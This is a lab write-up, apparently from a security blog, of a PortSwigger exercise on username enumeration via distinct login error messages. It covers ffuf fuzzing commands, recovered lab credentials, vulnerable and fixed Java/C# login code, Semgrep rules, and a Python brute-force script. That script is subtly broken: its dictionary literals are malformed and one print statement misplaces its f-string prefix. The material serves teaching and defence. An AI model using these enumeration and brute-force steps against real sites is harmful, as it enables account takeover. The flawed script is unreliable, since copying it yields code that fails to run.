---
title: "Lab 01 : Username enumeration via different responses"
date: 2025-12-19
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-19-lab01_authentication/
---

## 1. Executive Summary

**Vulnerability:** Username Enumeration (via Verbose Error Messages).

**Description:** The application provides different error messages depending on whether a submitted username exists in the database. When an unknown username is entered, the error explicitly states "Invalid username." When a valid username is entered with the wrong password, the error changes (e.g., to "Incorrect password"), confirming the user's existence.

**Impact:** Attackers can valid user accounts without knowing passwords. This drastically reduces the complexity of a brute-force attack from "Guess User + Password" to just "Guess Password."

## 2. The Attack

**Objective:** Enumerate a valid username and then brute-force their password to hijack the account.

1. **Reconnaissance:** I attempted to log in with a random user (`test`) and password (`test`). The error message returned was **"Invalid username"**.
2. **Hypothesis:** If I supply a correct username, the error message might change to something like "Invalid password."
3. **Enumeration (Username):** I used `ffuf` to fuzz the username field using the provided wordlist.
    - **Command:**
        
        ```bash
        ffuf -X POST -w ./usernames.txt -u https://0a17009303ddefcf81201b9700a600dd.web-security-academy.net/login  -d 'username=FUZZ&password=password' -fs 3140
        ```
        
    - **Filtering:** I looked for responses that *differed* in size or text.
    - **Result:** The username `argentina` returned a different response (likely "Incorrect password").
        
        ![image.png](image.png)
        
4. **Brute-Force (Password):** Knowing the target is `argentina`, I switched the fuzzing target to the password field.
    - **Command:**
        
        ```bash
        ffuf -X POST -w ./passwords.txt -u https://0a17009303ddefcf81201b9700a600dd.web-security-academy.net/login  -d 'username=argentina&password=FUZZ' -fs 3142
        ```
        
        ![image.png](image%201.png)
        
    - **Result:** The password `computer` returned a 302 Redirect (successful login) or a different response size indicating success.
5. **Access:** I logged in with `argentina:computer` and accessed the account page.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The authentication logic "fails fast" and is too helpful. It checks the username first and returns an error immediately if it's not found. It only checks the password if the username exists.

- **The Flaw:** Conditional Logic leaking state. The `if/else` block clearly separates "User Not Found" from "Password Invalid."
- **The Reality:** Security best practices dictate generic errors.

### Java (Spring Boot)

```java
@PostMapping("/login")
public String login(@RequestParam String username, @RequestParam String password, Model model) {

    User user = userRepository.findByUsername(username);

    // VULNERABLE: Explicitly telling the user that the account doesn't exist.
    if (user == null) {
        model.addAttribute("error", "Invalid username");
        return "login";
    }

    // VULNERABLE: If we reach here, the attacker knows the user exists.
    if (!passwordEncoder.matches(password, user.getPassword())) {
        model.addAttribute("error", "Incorrect password");
        return "login";
    }

    return "redirect:/my-account";
}
```

**Technical Flow & Syntax Explanation:**

- **`userRepository.findByUsername(username)`**: Attempts to find the user entity.
- **`if (user == null)`**: This check determines if the username is valid. Inside this block, the code sets the error message "Invalid username". An attacker seeing this knows the username is wrong.
- **`passwordEncoder.matches(...)`**: This check only runs if the user *was* found. If this fails, the error becomes "Incorrect password". An attacker seeing this knows the username was *right*, but the password was wrong.

### C# (ASP.NET Core)

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login(LoginRequest request)
{
    var user = await _userManager.FindByNameAsync(request.Username);

    // VULNERABLE: Distinct error for missing user
    if (user == null)
    {
        return BadRequest("Invalid username");
    }

    var result = await _signInManager.CheckPasswordSignInAsync(user, request.Password, false);

    // VULNERABLE: Distinct error for wrong password
    if (!result.Succeeded)
    {
        return BadRequest("Incorrect password");
    }

    return Ok();
}
```

**Technical Flow & Syntax Explanation:**

- **`FindByNameAsync`**: Looks up the user record.
- **`BadRequest("Invalid username")`**: Returns an HTTP 400 with a specific string telling the client the user doesn't exist.
- **`CheckPasswordSignInAsync`**: Validates the password hash.
- **`BadRequest("Incorrect password")`**: Returns a specific string telling the client the password is the only thing wrong.

### Mock PR Comment

The login endpoint returns distinct error messages ("Invalid username" vs. "Incorrect password"). This allows attackers to enumerate valid usernames by analyzing the error text.

Please consolidate these errors into a single, generic message such as "Invalid username or password" and ensure the response time is consistent regardless of whether the user exists.

## 4. The Fix

**Explanation of the Fix:**
We must ensure the application behaves exactly the same way whether the user exists or not. This means returning a generic error message ("Invalid credentials") and ideally ensuring the timing of the request is consistent (though timing attacks are harder to exploit).

### Secure Java

```java
@PostMapping("/login")
public String login(@RequestParam String username, @RequestParam String password, Model model) {
    
    User user = userRepository.findByUsername(username);
    
    // SECURE: We create a boolean but DO NOT return early.
    // In a real system, you might even hash a dummy password to equalize timing.
    boolean loginSuccess = false;
    
    if (user != null) {
        if (passwordEncoder.matches(password, user.getPassword())) {
            loginSuccess = true;
        }
    } else {
         // Optional: Perform a dummy hash check here to mitigate timing attacks
         // passwordEncoder.matches(password, DUMMY_HASH);
    }

    if (!loginSuccess) {
        // SECURE: Generic error message.
        model.addAttribute("error", "Invalid username or password");
        return "login";
    }

    return "redirect:/my-account";
}
```

**Technical Flow & Syntax Explanation:**

- **Generic Message**: Both the "User Not Found" case and "Wrong Password" case result in "Invalid username or password".
- **Flow Consolidation**: The code structure tries to avoid immediate returns that distinguish the two states visibly.

### Secure C#

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login(LoginRequest request)
{
    var user = await _userManager.FindByNameAsync(request.Username);
    bool isAuthorized = false;

    if (user != null)
    {
        var result = await _signInManager.CheckPasswordSignInAsync(user, request.Password, false);
        if (result.Succeeded) isAuthorized = true;
    }

    if (!isAuthorized)
    {
        // SECURE: Ambiguous error message
        return BadRequest("Invalid username or password");
    }

    return Ok();
}
```

**Technical Flow & Syntax Explanation:**

- **`isAuthorized` flag**: We track success internally but present a unified failure state to the outside world.
- **Single Return Path for Errors**: The API returns the exact same HTTP Status and Body for all failures.

## 5. Automation

*A Python script that performs the enumeration and brute force automatically using `argparse`.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_auth(url, usernames_file, passwords_file):
    login_url = f"{url.rstrip("/")}/login"

    print(f"[*] Targeting: {login_url}")

    valid_user = None

    print(f"[*] Starting Username Enumeration...")
    with open(usernames_file, 'r') as f:
        usernames = [line.strip() for line in f]

    for user in usernames:
        data = {'username:' user, 'password:' 'dummyPass'}
        resp = requests.post(login_url, data=data)

        if "Invalid username" not in resp.text:
            print(f"[+] FOUND VALID USERNAME: {user}")
            valid_user = user
            break

    if not valid_user:
        print("[-] Failed to enumerate username.")
        sys.exit(1)

    print("f[*] Brute forcing password for {valid_user}...")
    with open(passwords_file, 'r') as f:
        passwords = [line.strip() for line in f]

    for pwd in passwords:
        data = {'username:' valid_user, 'password:' pwd}
        resp = requests.post(login_url, data=data)

        if "Incorrect password" not in resp.text and "Invalid username" not in resp.text:
            print(f"[!!!] SUCCESS: Credentials are {valid_user}:{pwd}")
            return
            
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Base URL of the lab")
    ap.add_argument("userlist", help="Path to usernames.txt")
    ap.add_argument("passlist", help="Path to passwords.txt")
    
    args = ap.parse_args()
    exploit_auth(args.url, args.userlist, args.passlist)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules detect backend logic that returns different error strings based on user existence.*

### Java Rule

```yaml
rules:
  - id: java-user-enum-error-message
    languages: [java]
    message: "Potential Username Enumeration: Different error messages for user lookup failures."
    severity: WARNING
    patterns:
      - pattern-either:
          - pattern: |
              if ($USER == null) { ... "Invalid username" ... }
          - pattern: |
              if ($USER == null) { ... "User not found" ... }
```

**Technical Flow & Syntax Explanation:**

- **`pattern-either`**: Checks for multiple variations of explicit "User not found" logic.
- **`"Invalid username"`**: Explicitly flagging the dangerous string literal that gives away the state.

### C# Rule

```yaml
rules:
  - id: csharp-user-enum-error-message
    languages: [csharp]
    message: "Authentication returns specific error 'Invalid username' allowing enumeration."
    severity: WARNING
    patterns:
      - pattern: |
          if ($USER == null) { return BadRequest("Invalid username"); }
```

**Technical Flow & Syntax Explanation:**

- **`BadRequest("Invalid username")`**: Detects the specific ASP.NET Core pattern of returning a 400 error with the specific text causing the leak.
